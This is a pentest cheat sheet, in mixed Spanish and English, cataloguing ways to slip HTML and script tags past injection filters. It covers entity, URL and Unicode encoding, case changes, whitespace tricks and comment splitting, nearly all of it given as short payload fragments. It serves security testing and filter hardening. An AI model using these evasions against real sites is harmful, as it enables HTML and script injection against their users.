---
aliases:
  - HTML Injection Bypass
  - HTML Filter Evasion
  - HTML Entity Bypass
tags:
  - type/cheatsheet
  - vuln/html-injection
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTML Injection]]'
---
# HTML Injection - Bypass de Filtros

***

## HTML Entity Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<` (less than) | `&lt;` | NOT bypass — already escaped. |
| `<` decimal | `&#60;` | Browser parses as `<` after decode. |
| `<` hex | `&#x3c;` | Same. |
| `<` zero-padded | `&#0000060;` o `&#x0000003c;` | More zeros. |
| `<` w/o semi | `&#60` | Some parsers tolerate. |
| `<` mixed case hex | `&#x3C;` (uppercase X) | Same. |
| Encoded tag | `&lt;script&gt;` | If filter only blocks literal `<script>`. |
| Encoded letters | `&#83;cript` (S=83) | Letter encoded in middle. |
| Numeric reference variants | `&#x0000003c;`, `&#0000060;` | Multiple length. |
| Unicode escape | `<` (full-width) U+FF1C | NFKC-normalize bypass. |
| Emoji-style | Various Unicode lookalikes | Limited but possible. |
| Combined | `&#x3c;img&#x20;src&#x3d;...&#x3e;` | Full tag encoded. |
| Half-encoded | `<i&#x6d;g src=...>` | Partial encoding. |
| Tag attribute encoded | `<img s&#x72;c="...">` | Attribute name encoded. |
^htmli-bypass-entity

___

## URL / Unicode Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| URL encode `<` | `%3C` | Bypass HTTP-layer filters. |
| URL encode `>` | `%3E` | Same. |
| URL encode `"` | `%22` | Attribute context. |
| Doble URL encode | `%253C` | If multi-decode. |
| Unicode char `＜` (U+FF1C) | Full-width less-than | NFKC normalization. |
| Unicode char `›` | Single right angle quotation | Edge. |
| Right-to-left override `‮` | Visual reordering | Lookalike domain abuse. |
| Mixed encoding | URL + entity en mismo payload | Multi-layer bypass. |
| Hex escape | `\x3c` literal | If interpreted (rare). |
| Octal escape | `\074` | Edge. |
| UTF-7 (legacy) | `+ADw-script+AD4-` | Old browsers. |
| UTF-16 BE/LE BOM | Byte order mark prefix | Edge. |
| Punycode | `xn--...` | Domain spoofing context. |
| Reserved char encoding | `%26` for `&`, `%23` for `#` | Encoded entities. |
^htmli-bypass-url

___

## Tag/Attribute Case Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>` lowercase | `<SCRIPT>` uppercase | Some filters case-sensitive. |
| Mixed case | `<ScRiPt>` | Same. |
| Tag attribute case | `<img SRC="...">` | Attribute names case-insensitive en HTML. |
| Insert null between letters | `<scr%00ipt>` | Some browsers tolerate. |
| Tag with no space | `<imgsrc=x>` | NOT valid but some parsers accept. |
| Non-standard tag | `<svG>`, `<MaTh>` | Less filtered tags. |
| Self-closing variants | `<br/>` vs `<br>` vs `<br >` | Whitespace variants. |
| Tag with extra whitespace | `<     script     >` | Spaces tolerated. |
| HTML comment break | `<scr<!-- -->ipt>` | NOT valid en strict parsing. |
| Multi-line tag | `<img\nsrc=\nx>` | Newlines en tags ok. |
| Tag with `/` self-close | `<svg/>` | XML-style. |
| HTML5 specific tags | `<picture>`, `<source>`, `<details>` | Less filtered. |
| Conditional comments | `<!--[if IE]><script>...<![endif]-->` | IE only. |
^htmli-bypass-case

___

## Whitespace Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Tab in tag | `<img\tsrc=x>` | Browser normalizes. |
| Newline in tag | `<img\nsrc=x>` | Same. |
| Vertical tab | `<img\x0bsrc=x>` | Edge. |
| Form feed | `<img\x0csrc=x>` | Edge. |
| NUL byte | `<img\x00src=x>` | Some parsers truncate. |
| Carriage return | `<img\rsrc=x>` | Same as newline. |
| Multi-whitespace en attr | `<img   src   =   x>` | Spaces around `=`. |
| Quotes optional | `<img src=x>` (sin quotes) | HTML allows attr sin quotes para simple values. |
| Single vs double quotes | `<img src='x'>` vs `<img src="x">` | Both valid. |
| Backtick quotes | `<img src=\`x\`>` | NON-standard but IE tolerated. |
| Quote replacement con encoded | `<img src=&#x22;...&#x22;>` | Attribute string entity-encoded. |
| Whitespace in attr value | `<img src=" x">` | Leading whitespace. |
| Tag with extra `>` | `<img src=x>>` | Extra char tolerated. |
| Comments inside tag | `<img <!-- --> src=x>` | NOT valid mostly. |
^htmli-bypass-whitespace

___

## Comment Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Standard comment | `<!-- comment -->` | HTML comments. |
| Filter break | `<scr<!---->ipt>` | If filter doesn't strip comments. |
| Comment terminator | `--!>` | Edge case terminator. |
| Conditional comment | `<!--[if IE]>...<![endif]-->` | IE only — modern browsers ignore. |
| Conditional comment outside IE | `<!--[if !IE]>--><script>...<!--<![endif]-->` | Reverse condition. |
| Mismatched comment | `<!-- a --> b --> c` | Multi-comment handling. |
| Comment with HTML | `<!-- <script>alert(1)</script> -->` | NOT executed in standard. |
| Server-side comment leak | If comment includes secret | Disclosure. |
| Persistent comment | Stored input con comment | Deface but invisible. |
| MultiByte comment | Unicode comment chars | Edge. |
| CDATA section | `<![CDATA[...]]>` | XML CDATA — only in XML serialization. |
| Processing instruction | `<?php ?>` like | XML-only. |
^htmli-bypass-comment

***
